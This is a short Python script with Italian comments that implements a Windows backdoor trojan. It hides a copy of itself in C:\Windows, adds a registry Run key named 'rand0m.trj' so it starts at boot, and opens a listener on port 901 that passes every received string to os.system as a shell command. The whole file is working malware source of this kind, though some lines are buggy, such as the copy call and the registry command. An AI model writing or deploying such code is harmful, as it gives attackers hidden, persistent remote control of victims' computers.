#!/usr/bin/python
#brat volk
#-------------------------------------------------------------------------------------------------------------
#importiamo le librerie per interfacciarci con il sistema(os) , controllare i privilegi dello script(ctypes) , copiare il server(shutil) e creare un socket(socket)
import os
import socket
import ctypes
from shutil import copy


class main:
        #controlliamo il livello dello script (user/admin)
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if is_admin != 1 :
                print("need admin privileges!")
                os.system("pause")
        #troviamo la directory del server
        dir_path = os.path.dirname(os.path.realpath(__file__))
        file__name = os.path.basename(__file__)
        #copiamo il server nella directory di sistema
        copy(dir_path, "C:\\windows\\")
        #nascondiamo il server
        os.system("attrib +h C:\\windows\\" +file__name)
        #aggiungiamo server.exe allo startup nel regedit
        os.system('REG ADD \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WINDOWS\\CurrentVersion\\Run\\rand0m.trj\",\"C:\Windows\' +file__name+ '\"\n')
        #definiamo un socket in ascolto sul port 901
        socket1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket1.bind((socket.gethostname(), 901))
        socket1.listen(5)
        conn, addr = socket1.accept()
        #creiamo un loop che riceve i dati
        while 1:
             data = conn.recv(893892)
             os.system(data)
             if data == "done":
                 break
